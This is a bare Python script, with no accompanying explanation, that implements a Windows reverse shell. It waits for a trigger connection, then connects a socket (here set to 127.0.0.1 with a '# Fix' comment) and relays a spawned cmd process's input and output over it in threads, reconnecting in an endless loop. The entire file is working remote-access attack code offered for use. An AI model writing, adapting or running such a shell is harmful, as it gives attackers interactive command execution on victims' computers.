import socket, subprocess, threading, time ,os

def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()


def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))


def wait_for_message(ip, port):
    # Create a socket object
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket to a specific IP address and port
    server_socket.bind((ip, port))

    # Listen for incoming connections
    server_socket.listen(1)
    # print(f"Waiting for a connection on {ip}:{port}...")

    # Accept a connection from a client
    client_socket, client_address = server_socket.accept()
    # print(f"Connection established with {client_address}")

    # Receive and print the message
    # message = client_socket.recv(1024).decode('utf-8')
    # print(f"Received message: {message}")

    # Close the sockets
    client_socket.close()
    server_socket.close()


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    self_ip = socket.gethostbyname(socket.gethostname())
    port = int(socket.gethostbyname(socket.gethostname()).split(".")[-1])

    ip = "127.0.0.1"

    wait_for_message(self_ip, port)

    time.sleep(2)

    s.connect((ip, port))  # Fix

    p = subprocess.Popen(
        ["cmd"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        stdin=subprocess.PIPE,
        shell=True,
    )

    s2p_thread = threading.Thread(target=s2p, args=[s, p])
    s2p_thread.daemon = True
    s2p_thread.start()

    p2s_thread = threading.Thread(target=p2s, args=[s, p])
    p2s_thread.daemon = True
    p2s_thread.start()

    try:
        p.wait()
    except KeyboardInterrupt:
        s.close()


while True:
    main()
# main()
